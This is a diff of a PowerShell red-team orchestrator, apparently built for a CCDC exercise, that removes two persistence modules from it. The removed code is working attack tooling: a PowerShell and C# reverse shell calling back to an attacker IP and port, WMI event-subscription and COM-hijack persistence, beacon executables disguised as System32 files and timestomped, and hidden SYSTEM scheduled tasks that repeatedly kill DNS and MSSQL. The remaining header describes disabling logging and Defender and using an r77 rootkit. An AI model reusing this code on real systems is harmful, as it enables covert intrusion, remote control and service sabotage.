@@ -1,8 +1,8 @@
-﻿# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
 # CCDC Windows Phase 3 — COMBINED Orchestrator
 # ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
 #
-# Embeds all 8 Phase 3 component scripts as Invoke-* functions.
+# Embeds all 6 Phase 3 component scripts as Invoke-* functions.
 # Self-contained — no external script files required at deploy time.
 #
 # MODULES (execution order is fixed):
@@ -12,13 +12,6 @@
 #   4  KerberosKhaos        T1484.001/.002/T1222/T1531          DC only
 #   5  ConditionalSurrender T1565.001/T1584.002/T1562.004       DNS role
 #   6  DeadInTheWater       T1489/T1565.001/T1562.004/T1222     MSSQL only
-#   7  ClockworkChaos       T1053.005/T1489/T1036.003/T1070.006 All
-#   8  GhostInTheWMI        T1546.003/.015/T1547.010            All (MUST RUN LAST)
-#
-# IMPORTANT — ClockworkChaos (module 7):
-#   Pass -BeaconPath1 and -BeaconPath2 to stage Sliver beacon EXEs and enable
-#   Tasks 3+4 (beacon execution every 10 min).  If omitted, only Tasks 1+2
-#   (DNS/MSSQL service killers every 3 min) are registered.
 #
 # IMPORTANT — r77 rootkit mode:
 #   Script prompts at startup whether r77 is active (-UseR77 skips the prompt).
@@ -30,12 +23,9 @@
 #   .\CCDC_Windows_P3_COMBINED.ps1 -All
 #   .\CCDC_Windows_P3_COMBINED.ps1 -Targets DefenderOnly
 #   .\CCDC_Windows_P3_COMBINED.ps1 -Targets ServiceOnly
-#   .\CCDC_Windows_P3_COMBINED.ps1 -Targets PersistenceOnly
-#   .\CCDC_Windows_P3_COMBINED.ps1 -Modules 1,3,8
-#   .\CCDC_Windows_P3_COMBINED.ps1 -Modules BlindSpot,GhostInTheWMI
+#   .\CCDC_Windows_P3_COMBINED.ps1 -Modules 1,3,6
+#   .\CCDC_Windows_P3_COMBINED.ps1 -Modules BlindSpot,DeadInTheWater
 #   .\CCDC_Windows_P3_COMBINED.ps1 -Status
-#   .\CCDC_Windows_P3_COMBINED.ps1 -AttackerIP 10.0.0.5 -AttackerPort 4444
-#   .\CCDC_Windows_P3_COMBINED.ps1 -BeaconPath1 .\b1.exe -BeaconPath2 .\b2.exe
 #   .\CCDC_Windows_P3_COMBINED.ps1 -UseR77            # enable $77 file prefix
 #   .\CCDC_Windows_P3_COMBINED.ps1 -Resume         # skip already-SUCCESS modules
 #   .\CCDC_Windows_P3_COMBINED.ps1 -Force          # re-run even if SUCCESS
@@ -47,7 +37,6 @@
 #
 # IMPORTANT — EXECUTION ORDER:
 #   BlindSpot MUST run first (kills logging before other ops are recorded).
-#   GhostInTheWMI MUST run last (WMI infrastructure intact for persistence).
 #   KerberosKhaos MUST run before ConditionalSurrender (gpupdate needs DNS).
 #
 # Plan: Phase_3_Tools/Scripts_Planning/Phase3_Windows_Plan.md
@@ -58,18 +47,13 @@
 
 [CmdletBinding()]
 param(
-    [ValidateSet('All','DefenderOnly','ServiceOnly','PersistenceOnly')]
+    [ValidateSet('All','DefenderOnly','ServiceOnly')]
     [string]   $Targets      = 'All',
     [string[]] $Modules      = @(),
     [switch]   $All,
     [switch]   $Status,
     [switch]   $Resume,
     [switch]   $Force,
-    [string]   $AttackerIP   = "10.0.0.1",
-    [int]      $AttackerPort = 4444,
-    # ClockworkChaos beacon paths (optional — Tasks 3+4 skipped if absent)
-    [string]   $BeaconPath1  = '',
-    [string]   $BeaconPath2  = '',
     # r77 mode — set to skip the interactive prompt and force-enable $77 prefix
     [switch]   $UseR77
 )
@@ -77,10 +61,6 @@ param(
 $ErrorActionPreference = "Continue"
 
 #region OPERATOR CONFIG
-$script:AttackerIP   = $AttackerIP
-$script:AttackerPort = $AttackerPort
-$script:BeaconPath1  = $BeaconPath1
-$script:BeaconPath2  = $BeaconPath2
 $script:HidePrefix   = ''   # set to '$77' when r77 mode is active
 #endregion
 
@@ -144,7 +124,7 @@ function Show-Banner {
     Write-Host " ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\" -ForegroundColor Red
     Write-Host "  CCDC WINDOWS — PHASE 3 COMBINED" -ForegroundColor Red
     Write-Host "  BlindSpot · BreakingBad · NoEscape · KerberosKhaos" -ForegroundColor DarkRed
-    Write-Host "  ConditionalSurrender · DeadInTheWater · ClockworkChaos · GhostInTheWMI" -ForegroundColor DarkRed
+    Write-Host "  ConditionalSurrender · DeadInTheWater" -ForegroundColor DarkRed
     Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\///////////////////////////////  " -ForegroundColor Red
     Write-Host ""
 }
@@ -1798,456 +1778,6 @@ function Invoke-DeadInTheWater {
 }
 
 # ─────────────────────────────────────────────────────────────────────────────
-# MODULE 7 — PERSISTENCE: CLOCKWORK CHAOS
-# ─────────────────────────────────────────────────────────────────────────────
-function Invoke-ClockworkChaos {
-    Write-Section "7/8 — ClockworkChaos: Scheduled Task Service Kill + Beacon Persistence"
-
-    $b1      = $script:BeaconPath1
-    $b2      = $script:BeaconPath2
-    $prefix  = $script:HidePrefix
-    $hasB1   = ($b1 -ne '') -and (Test-Path $b1 -PathType Leaf -ErrorAction SilentlyContinue)
-    $hasB2   = ($b2 -ne '') -and (Test-Path $b2 -PathType Leaf -ErrorAction SilentlyContinue)
-    $hasBeacons = $hasB1 -and $hasB2
-
-    if (-not $hasBeacons) {
-        if ($b1 -ne '' -or $b2 -ne '') {
-            Write-Warn "One or both beacon paths invalid/not found — Tasks 3+4 (beacon execution) will be skipped"
-            Write-Warn "  BeaconPath1: $(if($b1){'specified: '+$b1}else{'not provided'})"
-            Write-Warn "  BeaconPath2: $(if($b2){'specified: '+$b2}else{'not provided'})"
-        } else {
-            Write-Info "No beacon paths provided — registering service-killer tasks only (Tasks 1+2)"
-        }
-    }
-
-    # ── Reference timestamp (ntdll → kernel32 → user32 → hardcoded) ─────────────
-    Write-Section "Reference Timestamp"
-
-    $script:CCRefTime = $null
-    foreach ($candidate in @(
-        "$env:SystemRoot\System32\ntdll.dll",
-        "$env:SystemRoot\System32\kernel32.dll",
-        "$env:SystemRoot\System32\user32.dll"
-    )) {
-        if (Test-Path $candidate) {
-            $script:CCRefTime = (Get-Item $candidate -Force).LastWriteTime
-            Write-Success "Reference timestamp: $($script:CCRefTime)  (from $(Split-Path $candidate -Leaf))"
-            break
-        }
-    }
-    if ($null -eq $script:CCRefTime) {
-        $script:CCRefTime = [datetime]"2019-03-19 03:44:22"
-        Write-Warn "Using fallback timestamp: $($script:CCRefTime)"
-    }
-
-    # ── Helpers ───────────────────────────────────────────────────────────────────
-    function Invoke-CCTimestomp {
-        param([string]$Path)
-        if (-not (Test-Path $Path -PathType Leaf)) { return }
-        try {
-            [System.IO.File]::SetCreationTime($Path,   $script:CCRefTime)
-            [System.IO.File]::SetLastWriteTime($Path,  $script:CCRefTime)
-            [System.IO.File]::SetLastAccessTime($Path, $script:CCRefTime)
-        } catch { Write-Warn "  Timestomp failed [$Path]: $_" }
-    }
-
-    function Set-CCStealthAttributes {
-        param([string]$Path)
-        try {
-            $item = Get-Item -LiteralPath $Path -Force -ErrorAction Stop
-            $item.Attributes = $item.Attributes -bor
-                [System.IO.FileAttributes]::Hidden -bor
-                [System.IO.FileAttributes]::System
-        } catch { Write-Warn "  StealthAttrib failed [$Path]: $_" }
-    }
-
-    # ── Binary staging (Tasks 3+4 only, skipped if no valid beacons) ─────────────
-    $StagedPath1 = $null
-    $StagedPath2 = $null
-
-    if ($hasBeacons) {
-        Write-Section "Binary Staging  (T1036.003 + T1070.006)"
-
-        $MaskedName1 = "${prefix}taskhostw_mon.exe"
-        $MaskedName2 = "${prefix}wermgr_svc.exe"
-        $StagedPath1 = "$env:SystemRoot\System32\$MaskedName1"
-        $StagedPath2 = "$env:SystemRoot\System32\$MaskedName2"
-
-        foreach ($pair in @(
-            @{ Src = $b1; Dst = $StagedPath1; Label = "Beacon 1" },
-            @{ Src = $b2; Dst = $StagedPath2; Label = "Beacon 2" }
-        )) {
-            Write-Info "Staging $($pair.Label): $($pair.Src) -> $($pair.Dst)"
-            try {
-                Copy-Item -Path $pair.Src -Destination $pair.Dst -Force -ErrorAction Stop
-                Set-CCStealthAttributes -Path $pair.Dst
-                Invoke-CCTimestomp      -Path $pair.Dst
-                $null = icacls.exe $pair.Dst /inheritance:r /grant:r "NT AUTHORITY\SYSTEM:(F)" 2>&1
-                $null = icacls.exe $pair.Dst /deny "BUILTIN\Users:(RX)" 2>&1
-                Write-Success "  Staged   : $($pair.Dst)"
-            } catch {
-                Write-Err "  Staging failed for $($pair.Label): $_"
-                $StagedPath1 = $null; $StagedPath2 = $null
-                break
-            }
-        }
-    }
-
-    # ── Service-killer payloads (Base64-encoded PS commands) ─────────────────────
-    Write-Section "Building Service-Killer Payloads  (T1489)"
-
-    $DnsScript = @'
-$s = Get-Service -Name DNS -ErrorAction SilentlyContinue
-if ($s -and $s.Status -eq 'Running') { Stop-Service -Name DNS -Force -ErrorAction SilentlyContinue }
-'@
-    $DnsEncoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($DnsScript))
-    Write-Success "DNS stop payload encoded"
-
-    $SqlScript = @'
-$s = Get-Service -Name SQLBrowser -ErrorAction SilentlyContinue
-if ($s) { Stop-Service -Name SQLBrowser -Force -ErrorAction SilentlyContinue; Set-Service -Name SQLBrowser -StartupType Disabled -ErrorAction SilentlyContinue }
-$s2 = Get-Service -Name MSSQLSERVER -ErrorAction SilentlyContinue
-if ($s2 -and $s2.Status -eq 'Running') { Stop-Service -Name MSSQLSERVER -Force -ErrorAction SilentlyContinue }
-'@
-    $SqlEncoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($SqlScript))
-    Write-Success "MSSQL stop payload encoded"
-
-    # ── Common task components ────────────────────────────────────────────────────
-    $CommonSettings = New-ScheduledTaskSettingsSet `
-        -Hidden `
-        -ExecutionTimeLimit     (New-TimeSpan -Hours 0) `
-        -RestartCount           3 `
-        -RestartInterval        (New-TimeSpan -Minutes 1) `
-        -StartWhenAvailable `
-        -RunOnlyIfNetworkAvailable:$false
-
-    $SystemPrincipal = New-ScheduledTaskPrincipal `
-        -UserId    "SYSTEM" `
-        -LogonType ServiceAccount `
-        -RunLevel  Highest
-
-    # ── Register scheduled tasks ──────────────────────────────────────────────────
-    Write-Section "Registering Scheduled Tasks  (T1053.005)"
-
-    # Task 1: DnsClientCacheCleanup — stops DNS every 3 min (DNS role only)
-    if ($script:IsDNS) {
-        $T1Name = "DnsClientCacheCleanup"
-        Write-Info "Registering $T1Name ..."
-        try {
-            Unregister-ScheduledTask -TaskName $T1Name -Confirm:$false -ErrorAction SilentlyContinue
-            $t1Action  = New-ScheduledTaskAction `
-                -Execute  "powershell.exe" `
-                -Argument "-NonInteractive -WindowStyle Hidden -EncodedCommand $DnsEncoded"
-            $t1Trigger = New-ScheduledTaskTrigger `
-                -RepetitionInterval (New-TimeSpan -Minutes 3) `
-                -RepetitionDuration (New-TimeSpan -Days 3650) `
-                -Once -At (Get-Date).AddSeconds(10)
-            Register-ScheduledTask `
-                -TaskName    $T1Name `
-                -Action      $t1Action `
-                -Trigger     $t1Trigger `
-                -Settings    $CommonSettings `
-                -Principal   $SystemPrincipal `
-                -Description "Windows DNS client cache maintenance (system managed)" `
-                -Force | Out-Null
-            Write-Success "$T1Name registered  (every 3 min, SYSTEM, hidden)"
-        } catch {
-            Write-Err "Failed to register ${T1Name}: $_"
-        }
-    } else {
-        Write-Info "DNS role not detected — skipping Task 1 (DnsClientCacheCleanup)"
-    }
-
-    # Task 2: SqlServerHealthMonitor — stops MSSQL every 3 min (MSSQL role only)
-    if ($script:IsMSSQL) {
-        $T2Name = "SqlServerHealthMonitor"
-        Write-Info "Registering $T2Name ..."
-        try {
-            Unregister-ScheduledTask -TaskName $T2Name -Confirm:$false -ErrorAction SilentlyContinue
-            $t2Action  = New-ScheduledTaskAction `
-                -Execute  "powershell.exe" `
-                -Argument "-NonInteractive -WindowStyle Hidden -EncodedCommand $SqlEncoded"
-            $t2Trigger = New-ScheduledTaskTrigger `
-                -RepetitionInterval (New-TimeSpan -Minutes 3) `
-                -RepetitionDuration (New-TimeSpan -Days 3650) `
-                -Once -At (Get-Date).AddSeconds(25)
-            Register-ScheduledTask `
-                -TaskName    $T2Name `
-                -Action      $t2Action `
-                -Trigger     $t2Trigger `
-                -Settings    $CommonSettings `
-                -Principal   $SystemPrincipal `
-                -Description "SQL Server telemetry and health diagnostics (system managed)" `
-                -Force | Out-Null
-            Write-Success "$T2Name registered  (every 3 min, +15 s stagger, SYSTEM, hidden)"
-        } catch {
-            Write-Err "Failed to register ${T2Name}: $_"
-        }
-    } else {
-        Write-Info "MSSQL role not detected — skipping Task 2 (SqlServerHealthMonitor)"
-    }
-
-    # Task 3+4: beacon execution tasks (only if beacons were staged successfully)
-    if ($StagedPath1 -and $StagedPath2) {
-        $T3Name = "WindowsUpdateWorker"
-        Write-Info "Registering $T3Name ..."
-        try {
-            Unregister-ScheduledTask -TaskName $T3Name -Confirm:$false -ErrorAction SilentlyContinue
-            $t3Action  = New-ScheduledTaskAction -Execute $StagedPath1
-            $t3Trigger = New-ScheduledTaskTrigger `
-                -RepetitionInterval (New-TimeSpan -Minutes 10) `
-                -RepetitionDuration (New-TimeSpan -Days 3650) `
-                -Once -At (Get-Date).AddSeconds(40)
-            Register-ScheduledTask `
-                -TaskName    $T3Name `
-                -Action      $t3Action `
-                -Trigger     $t3Trigger `
-                -Settings    $CommonSettings `
-                -Principal   $SystemPrincipal `
-                -Description "Windows Update background worker (system managed)" `
-                -Force | Out-Null
-            Write-Success "$T3Name registered  (every 10 min, SYSTEM)  -> $StagedPath1"
-        } catch {
-            Write-Err "Failed to register ${T3Name}: $_"
-        }
-
-        $T4Name = "WmiPerfCounterSync"
-        Write-Info "Registering $T4Name ..."
-        try {
-            Unregister-ScheduledTask -TaskName $T4Name -Confirm:$false -ErrorAction SilentlyContinue
-            $t4Action  = New-ScheduledTaskAction -Execute $StagedPath2
-            $t4Trigger = New-ScheduledTaskTrigger `
-                -RepetitionInterval (New-TimeSpan -Minutes 10) `
-                -RepetitionDuration (New-TimeSpan -Days 3650) `
-                -Once -At (Get-Date).AddSeconds(55)
-            Register-ScheduledTask `
-                -TaskName    $T4Name `
-                -Action      $t4Action `
-                -Trigger     $t4Trigger `
-                -Settings    $CommonSettings `
-                -Principal   $SystemPrincipal `
-                -Description "WMI performance counter synchronisation service (system managed)" `
-                -Force | Out-Null
-            Write-Success "$T4Name registered  (every 10 min, +15 s stagger, SYSTEM)  -> $StagedPath2"
-        } catch {
-            Write-Err "Failed to register ${T4Name}: $_"
-        }
-    } else {
-        Write-Info "Beacon tasks (Tasks 3+4) skipped — provide -BeaconPath1 and -BeaconPath2 to enable"
-    }
-
-    Write-Host ""
-    Write-Success "ClockworkChaos complete"
-}
-
-# ─────────────────────────────────────────────────────────────────────────────
-# MODULE 8 — PERSISTENCE: GHOST IN THE WMI
-# ─────────────────────────────────────────────────────────────────────────────
-function Invoke-GhostInTheWMI {
-    param(
-        [string]$AttackerIP   = $script:AttackerIP,
-        [int]   $AttackerPort = $script:AttackerPort
-    )
-    Write-Section "8/8 — GhostInTheWMI: WMI Sub / COM Hijack / Print Monitor Persistence"
-    Write-Info "Payload target: $AttackerIP`:$AttackerPort"
-
-    # Shared Payload
-    Write-Section "Building shared reverse-shell payload"
-
-    $rawPayload = @'
-$c=New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',ATTACKER_PORT)
-$s=$c.GetStream()
-$w=New-Object System.IO.StreamWriter($s)
-$r=New-Object System.IO.StreamReader($s)
-$w.AutoFlush=$true
-$w.WriteLine("WMI Ghost @ "+$env:COMPUTERNAME)
-while($c.Connected){
-    try{
-        $cmd=$r.ReadLine()
-        if($cmd -eq $null -or $cmd -eq 'exit'){break}
-        $out=(Invoke-Expression $cmd 2>&1)|Out-String
-        $w.WriteLine($out)
-    }catch{$w.WriteLine($_.ToString())}
-}
-$c.Close()
-'@
-    $payloadStr = $rawPayload -replace 'ATTACKER_IP',$AttackerIP -replace 'ATTACKER_PORT',$AttackerPort
-    $encodedCmd = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payloadStr))
-    Write-Success "Payload encoded ($($encodedCmd.Length) chars) -> $AttackerIP`:$AttackerPort"
-
-    # MECHANISM 1: WMI Event Subscription
-    Write-Section "MECHANISM 1 — WMI Event Subscription (T1546.003)"
-
-    $wmiNS        = "root\subscription"
-    $filterName   = "WMIProviderHostCompatibility"
-    $consumerName = "WBEM_SyncHandler"
-
-    try {
-        Get-WmiObject -Namespace $wmiNS -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue |
-            Where-Object { $_.Filter -like "*$filterName*" } |
-            ForEach-Object { $_ | Remove-WmiObject -ErrorAction SilentlyContinue }
-
-        Get-WmiObject -Namespace $wmiNS -Class CommandLineEventConsumer `
-            -Filter "Name='$consumerName'" -ErrorAction SilentlyContinue |
-            Remove-WmiObject -ErrorAction SilentlyContinue
-
-        Get-WmiObject -Namespace $wmiNS -Class __EventFilter `
-            -Filter "Name='$filterName'" -ErrorAction SilentlyContinue |
-            Remove-WmiObject -ErrorAction SilentlyContinue
-
-        Write-Info "Cleared any pre-existing objects with these names"
-
-        $filter = Set-WmiInstance -Namespace $wmiNS -Class __EventFilter -Arguments @{
-            Name           = $filterName
-            EventNamespace = "root\cimv2"
-            QueryLanguage  = "WQL"
-            Query          = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'svchost.exe'"
-        }
-        Write-Success "EventFilter '$filterName' created"
-
-        $consumer = Set-WmiInstance -Namespace $wmiNS -Class CommandLineEventConsumer -Arguments @{
-            Name                = $consumerName
-            CommandLineTemplate = "powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand $encodedCmd"
-        }
-        Write-Success "CommandLineEventConsumer '$consumerName' created"
-
-        $null = Set-WmiInstance -Namespace $wmiNS -Class __FilterToConsumerBinding -Arguments @{
-            Filter   = $filter.__PATH
-            Consumer = $consumer.__PATH
-        }
-        Write-Success "FilterToConsumerBinding created"
-        Write-Info   "Fires on every svchost.exe start — triggers within minutes of boot"
-
-    } catch {
-        Write-Err "WMI subscription failed: $_"
-    }
-
-    # MECHANISM 2: COM Object Hijacking
-    Write-Section "MECHANISM 2 — COM Object Hijacking (T1546.015)"
-
-    $comClsid   = "{BCDE0395-E52F-467C-8E3D-C4579291692E}"
-    $comDllPath = "C:\Windows\Temp\$($script:HidePrefix)wbemperf.dll"
-
-    $comCsTemplate = @'
-using System;
-using System.Threading;
-using System.Net.Sockets;
-using System.IO;
-using System.Diagnostics;
-using System.Runtime.InteropServices;
-
-[ComVisible(true)]
-[Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")]
-public class WbemPerfCompat {
-    static WbemPerfCompat() {
-        var t = new Thread(() => {
-            Thread.Sleep(2000);
-            try {
-                var c = new TcpClient("ATTACKER_IP", ATTACKER_PORT);
-                var s = c.GetStream();
-                var w = new StreamWriter(s) { AutoFlush = true };
-                var r = new StreamReader(s);
-                w.WriteLine("COM Ghost @ " + Environment.MachineName);
-                while (c.Connected) {
-                    string cmd = r.ReadLine();
-                    if (cmd == null || cmd == "exit") break;
-                    try {
-                        var p = new ProcessStartInfo("powershell.exe",
-                            "-NonInteractive -NoProfile -Command " + cmd) {
-                            UseShellExecute        = false,
-                            RedirectStandardOutput = true,
-                            RedirectStandardError  = true,
-                            CreateNoWindow         = true
-                        };
-                        var proc = Process.Start(p);
-                        var stdout = proc.StandardOutput.ReadToEndAsync();
-                        var stderr = proc.StandardError.ReadToEndAsync();
-                        proc.WaitForExit();
-                        w.WriteLine(stdout.Result + stderr.Result);
-                    } catch (Exception ex) { w.WriteLine(ex.Message); }
-                }
-                c.Close();
-            } catch {}
-        });
-        t.IsBackground = true;
-        t.Start();
-    }
-}
-'@
-    $comCsSrc = $comCsTemplate -replace 'ATTACKER_IP',$AttackerIP -replace 'ATTACKER_PORT',$AttackerPort
-
-    try {
-        Write-Info "Compiling COM launcher assembly via Add-Type..."
-        Add-Type -TypeDefinition $comCsSrc -OutputAssembly $comDllPath -OutputType Library
-        Write-Success "Compiled: $comDllPath"
-
-        $regBase   = "HKCU:\Software\Classes\CLSID\$comClsid"
-        $regInproc = "$regBase\InprocServer32"
-        if (-not (Test-Path $regInproc)) {
-            New-Item -Path $regInproc -Force | Out-Null
-        }
-        $runtimeVer = "v" + [System.Runtime.InteropServices.RuntimeEnvironment]::GetSystemVersion().TrimStart('v')
-        Set-ItemProperty -Path $regInproc -Name "(Default)"      -Value "$env:SystemRoot\System32\mscoree.dll"
-        Set-ItemProperty -Path $regInproc -Name "ThreadingModel" -Value "Both"
-        Set-ItemProperty -Path $regInproc -Name "Assembly"       -Value ([System.Reflection.Assembly]::LoadFile($comDllPath).FullName)
-        Set-ItemProperty -Path $regInproc -Name "Class"          -Value "WbemPerfCompat"
-        Set-ItemProperty -Path $regInproc -Name "RuntimeVersion" -Value $runtimeVer
-        Set-ItemProperty -Path $regInproc -Name "CodeBase"       -Value "file:///$($comDllPath -replace '\\','/')"
-        Write-Success "HKCU CLSID $comClsid -> mscoree.dll (assembly: $comDllPath)"
-        Write-Info   "Fires when admin opens mmc.exe, taskschd.exe, or eventvwr.exe"
-
-    } catch {
-        Write-Err "COM hijack failed: $_"
-    }
-
-    # MECHANISM 3: Print Monitor DLL (Server only)
-    Write-Section "MECHANISM 3 — Print Monitor DLL (T1547.010)"
-
-    $osProductType = (Get-WmiObject Win32_OperatingSystem).ProductType
-    if ($osProductType -le 1) {
-        Write-Warn "Workstation detected (ProductType=$osProductType) — skipping Print Monitor (Server-only)"
-    } else {
-        Write-Info "Server target (ProductType=$osProductType) — deploying Print Monitor"
-
-        $monitorName    = "WMIPerfCounterMonitor"
-        $monitorDllName = "localspl_ext.dll"
-        $monitorKey     = "HKLM:\SYSTEM\CurrentControlSet\Control\Print\Monitors\$monitorName"
-
-        $fallbackScript = "$env:SystemRoot\System32\$($script:HidePrefix)wbemperf_mon.ps1"
-        $payloadBytes   = [System.Text.Encoding]::Unicode.GetBytes($payloadStr)
-        $fallbackEncCmd = [Convert]::ToBase64String($payloadBytes)
-
-        try {
-            Set-Content -Path $fallbackScript -Value "powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand $fallbackEncCmd" -Encoding ASCII
-            (Get-Item $fallbackScript).Attributes = 'Hidden,System'
-            Write-Success "Payload written: $fallbackScript"
-
-            $taskName = "WMIPerfCounterMonitor"
-            $action   = New-ScheduledTaskAction -Execute "powershell.exe" `
-                -Argument "-NonInteractive -WindowStyle Hidden -EncodedCommand $fallbackEncCmd"
-            $trigger  = New-ScheduledTaskTrigger -AtStartup
-            $settings = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit (New-TimeSpan -Hours 0)
-            $principal= New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
-            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger `
-                -Settings $settings -Principal $principal -Force | Out-Null
-            Write-Success "Scheduled task '$taskName' registered (SYSTEM, AtStartup) — T1547.010 fallback"
-
-            if (-not (Test-Path $monitorKey)) {
-                New-Item -Path $monitorKey -Force | Out-Null
-            }
-            Set-ItemProperty -Path $monitorKey -Name "Driver" -Value $monitorDllName
-            Write-Warn "Print Monitor DLL key written for future native-DLL swap"
-
-        } catch {
-            Write-Err "Print monitor fallback deployment failed: $_"
-        }
-    }
-
-    Write-Host ""
-    Write-Success "GhostInTheWMI complete — persistence mechanisms deployed"
-}
-
-# ─────────────────────────────────────────────────────────────────────────────
 # MODULE METADATA
 # ─────────────────────────────────────────────────────────────────────────────
 $_ModuleOrder = @(
@@ -2256,9 +1786,7 @@ $_ModuleOrder = @(
     'NoEscape',
     'KerberosKhaos',
     'ConditionalSurrender',
-    'DeadInTheWater',
-    'ClockworkChaos',
-    'GhostInTheWMI'
+    'DeadInTheWater'
 )
 
 # $null = All roles (runs everywhere); string = role variable name to check
@@ -2269,26 +1797,21 @@ $_RoleFilter = @{
     'KerberosKhaos'        = 'IsAD'
     'ConditionalSurrender' = 'IsDNS'
     'DeadInTheWater'       = 'IsMSSQL'
-    'ClockworkChaos'       = $null
-    'GhostInTheWMI'        = $null
 }
 
 $_CategoryMap = @{
-    'DefenderOnly'    = @('BlindSpot','BreakingBad','NoEscape')
-    'ServiceOnly'     = @('BlindSpot','KerberosKhaos','ConditionalSurrender','DeadInTheWater','ClockworkChaos')
-    'PersistenceOnly' = @('BlindSpot','ClockworkChaos','GhostInTheWMI')
-    'All'             = $_ModuleOrder
+    'DefenderOnly' = @('BlindSpot','BreakingBad','NoEscape')
+    'ServiceOnly'  = @('BlindSpot','KerberosKhaos','ConditionalSurrender','DeadInTheWater')
+    'All'          = $_ModuleOrder
 }
 
 $_ModuleMitre = @{
-    'ClockworkChaos'       = 'T1053.005/T1489'
     'BlindSpot'            = 'T1562.002/.006'
     'BreakingBad'          = 'T1562.001/T1490'
     'NoEscape'             = 'T1562.001/T1553'
     'KerberosKhaos'        = 'T1484.001/.002'
     'ConditionalSurrender' = 'T1565.001/T1584'
     'DeadInTheWater'       = 'T1489/T1565.001'
-    'GhostInTheWMI'        = 'T1546.003/.015'
 }
 
 $_ModuleRole = @{
@@ -2298,8 +1821,6 @@ $_ModuleRole = @{
     'KerberosKhaos'        = 'DC only'
     'ConditionalSurrender' = 'DNS role'
     'DeadInTheWater'       = 'MSSQL only'
-    'ClockworkChaos'       = 'ALL'
-    'GhostInTheWMI'        = 'ALL'
 }
 
 $_nameAliases = @{
@@ -2309,8 +1830,6 @@ $_nameAliases = @{
     '4' = 'KerberosKhaos'; 'kerberoskhaos' = 'KerberosKhaos'; 'kerberos' = 'KerberosKhaos'; 'ad' = 'KerberosKhaos'; 'kk' = 'KerberosKhaos'
     '5' = 'ConditionalSurrender'; 'conditionalsurrender' = 'ConditionalSurrender'; 'dns' = 'ConditionalSurrender'; 'surrender' = 'ConditionalSurrender'
     '6' = 'DeadInTheWater'; 'deadinthewater' = 'DeadInTheWater'; 'mssql' = 'DeadInTheWater'; 'sql' = 'DeadInTheWater'; 'dead' = 'DeadInTheWater'
-    '7' = 'ClockworkChaos'; 'clockworkchaos' = 'ClockworkChaos'; 'clockwork' = 'ClockworkChaos'; 'chaos' = 'ClockworkChaos'; 'scheduler' = 'ClockworkChaos'
-    '8' = 'GhostInTheWMI'; 'ghostinthewmi' = 'GhostInTheWMI'; 'ghost' = 'GhostInTheWMI'; 'persist' = 'GhostInTheWMI'; 'wmi' = 'GhostInTheWMI'
 }
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -2470,8 +1989,6 @@ function Run-Modules {
                 'KerberosKhaos'        { Invoke-KerberosKhaos }
                 'ConditionalSurrender' { Invoke-ConditionalSurrender }
                 'DeadInTheWater'       { Invoke-DeadInTheWater }
-                'ClockworkChaos'       { Invoke-ClockworkChaos }
-                'GhostInTheWMI'        { Invoke-GhostInTheWMI -AttackerIP $script:AttackerIP -AttackerPort $script:AttackerPort }
             }
         } catch {
             Write-Err "Module $modName threw an unhandled exception: $_"
@@ -2535,10 +2052,6 @@ if ($script:HidePrefix) {
 }
 
 Write-Info "Detected roles: AD=$($script:IsAD)  MSSQL=$($script:IsMSSQL)  DNS=$($script:IsDNS)"
-Write-Info "C2 target: $($script:AttackerIP):$($script:AttackerPort)"
-if ($script:BeaconPath1 -or $script:BeaconPath2) {
-    Write-Info "Beacons: $($script:BeaconPath1)  |  $($script:BeaconPath2)"
-}
 Write-Host ""
 
 # -Status: show state file and exit
